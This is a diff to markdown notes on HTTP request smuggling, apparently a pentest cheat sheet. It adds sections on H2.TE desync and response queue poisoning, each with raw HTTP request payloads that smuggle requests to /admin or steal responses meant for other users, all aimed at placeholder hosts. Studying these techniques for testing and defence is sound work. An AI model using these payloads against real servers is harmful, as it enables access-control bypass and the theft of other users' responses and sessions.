@@ -22,7 +22,10 @@ HTTP request smuggling is a server-side attack that takes advantage of discrepan
     - [Perfom web cache poisoning](#perfom-web-cache-poisoning)
     - [Perform web cache deception](#perform-web-cache-deception)
 - **[HTTP/2](#http2)**
-
+- **[Exploit]**
+    - [H2.CL vulnerabilities](#h2cl)
+    - [H2.TE vulnerabilities](#h2te-vulnerabilities)
+    - [Response queue poisoning](#response-queue-poisoning)
 
 ## Explanation
 
@@ -582,7 +585,7 @@ header | value
 :path |	`/example`
 :authority |	`vulnerable-website.com`
 content-type |	`application/x-www-form-urlencoded`
-content-length |`	0`
+content-length | `0`
 
 body:
 
@@ -608,6 +611,79 @@ Content-Length: 10
 
 x=1GET / H
 ```
+
+### H2.TE vulnerabilities
+
+HTTP2 Front-end
+
+header | value
+--- | ---
+:method |	`POST`
+:path |	`/example`
+:authority |	`vulnerable-website.com`
+content-type |	`application/x-www-form-urlencoded`
+transfer-encoding | `chunked`
+
+body:
+
+```
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1
+```
+
+HTTP1 backend
+
+```
+POST /example HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=1GET / H
+```
+
+### Response queue poisoning
+
+Response queue poisoning is a powerful request smuggling attack that enables you to steal arbitrary responses intended for other users, potentially compromising their accounts and even the entire site.
+
+#### Prerequisite
+
+- The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles.
+- The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.
+- The attack does not result in either server closing the TCP connection. Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end.
+
+#### Stealing other users' responses
+
+![Stealing other users' responses](/web/img/stealing-other-users-responses.jpg)
+
+payload for H2.TE:
+
+```
+POST /x HTTP/2
+Host: vuln.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: vuln.net
+\r\n
+\r\n
+```
+
+This respond not found and return a not found to the next request, the idea is to be the third request to catch the answer of the victim request.
 
 ---
 
